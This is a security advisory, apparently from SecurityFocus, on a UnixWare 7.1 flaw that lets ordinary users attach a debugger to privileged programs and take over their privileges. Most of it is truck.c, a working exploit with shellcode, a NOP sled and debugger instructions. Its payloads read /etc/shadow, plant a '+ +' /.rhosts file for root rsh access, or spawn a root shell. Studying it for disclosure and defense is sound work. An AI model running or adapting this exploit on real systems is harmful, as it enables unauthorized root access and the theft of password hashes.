source: http://www.securityfocus.com/bid/869/info

Unixware's security model includes the concept of privileges. These can be assigned to processes and allow them to perform tasks that otherwise could only be performed by the root user. They allow programs to run with the minimum required privilege (as opposed to running as root). A vulnerability in Unixware's implementation of privileges allows regular users to attach a debugger to a running privileged program and take over its privileges.

Most Unix systems, including Uniware, place a number of restriction on how can regular users interact with setuid and setgid processes. For example they are not allowed to attach a debugger to them and the dynamic linker may ignore variables requesting the preloading of some shared libraries. Unixware's implementation of privileges provides no such protections for privileged programs allowing a user to attach a debugger to a running privileged program which has his same user uid and modifying it.

When a program that is listed in the /etc/security/tcb/privs is executed it is granted the privileges listed there. All a malicious has to do to exploit the problem is find a program listed in that file with the privileges it wishes to gain and executable by him. Example of programs executable by anyone with privileges include: /usr/ucb/w (DACREAD), /usr/bin/getdev (DACWRITE), and /usr/ucb/lpr (SETUID). 

/** =

 ** "Its a hole you could drive a truck through." =

 **                        -Aleph One
 **
 ** truck.c UnixWare 7.1 security model exploit
 ** Demonstrates how we own privileged processes =

 ** =

 ** Usage: cc -o truck truck.c
 ** ./truck <filetype>  where filetype is 1, 2 or 3 =

 ** (for dacread, dacwrite and setuid, respectively)
 **
 ** This will put $XNEC in the environment and run a shell.
 ** From there you must use gdb/debug to load a file of the
 ** type you chose (by checking /etc/security/tcb/privs)
 ** and setting a breakpoint at _init via "break _init".
 ** When you "run" and break at _init, change your EIP
 ** to something between 0x8046000 and 0x8048000 with =

 ** "set $eip = 0x8046b75" and "continue" twice.
 **
 **
 ** Brock Tellier btellier@usa.net
 **/ =



#include <stdlib.h>
#include <stdio.h>

char scoshell[]= /* This isn't a buffer overflow! really! */
"\xeb\x1b\x5e\x31\xdb\x89\x5e\x07\x89\x5e\x0c\x88\x5e\x11\x31\xc0"
"\xb0\x3b\x8d\x7e\x07\x89\xf9\x53\x51\x56\x56\xeb\x10\xe8\xe0\xff"
"\xff\xff/tmp/sm\xaa\xaa\xaa\xaa\x9a\xaa\xaa\xaa\xaa\x07\xaa";

                       =

#define LEN 3500
#define NOP 0x90

#define DACWRITE "void main() { system(\"echo + + > /.rhosts; chmod 700 \=

/.rhosts; chown root:sys /.rhosts; rsh -l root localhost sh -i \
\"); }\n"
#define DACREAD  "void main() { system(\"cat /etc/shadow\");}\n"
#define SETUID  "void main() { setreuid(0,0);system(\"/bin/sh\"); }\n"

void usage(int ftype) {
    fprintf(stderr, "Error: Usage: truck [filetype]\n");
    fprintf(stderr, "Where filetype is one of the following: \n");
    fprintf(stderr, "1 dacread\n2 dacwrite\n3 setuid\n");
    fprintf(stderr, "Note: if file has allprivs, use setuid\n");
}
void buildsm(int ftype) {
  FILE *fp;
  char cc[100];
  fp = fopen("/tmp/sm.c", "w");

  if (ftype == 1) fprintf(fp, DACREAD);
    else if(ftype == 2) fprintf(fp, DACWRITE);
    else if(ftype == 3) fprintf(fp, SETUID);

  fclose(fp);
  snprintf(cc, sizeof(cc), "cc -o /tmp/sm /tmp/sm.c");
  system(cc);

}

int main(int argc, char *argv[]) {

int i;
int buflen = LEN;
char buf[LEN]; =

int filetype = 0;
char filebuf[20]; =


 if(argc > 2 || argc == 1) {
    usage(filetype);
    exit(0); =

 }

 if ( argc > 1 ) filetype=atoi(argv[1]);
 if ( filetype > 3 || filetype < 1 ) { usage(filetype); exit(-1); }
 buildsm(filetype);

fprintf(stderr, "\nUnixWare 7.1 security model exploit\n");
fprintf(stderr, "Brock Tellier btellier@usa.net\n\n");

memset(buf,NOP,buflen);
memcpy(buf+(buflen - strlen(scoshell) - 1),scoshell,strlen(scoshell));

memcpy(buf, "XNEC=", 5);
putenv(buf);
buf[buflen - 1] = 0;

system("/bin/sh");
exit(0);
}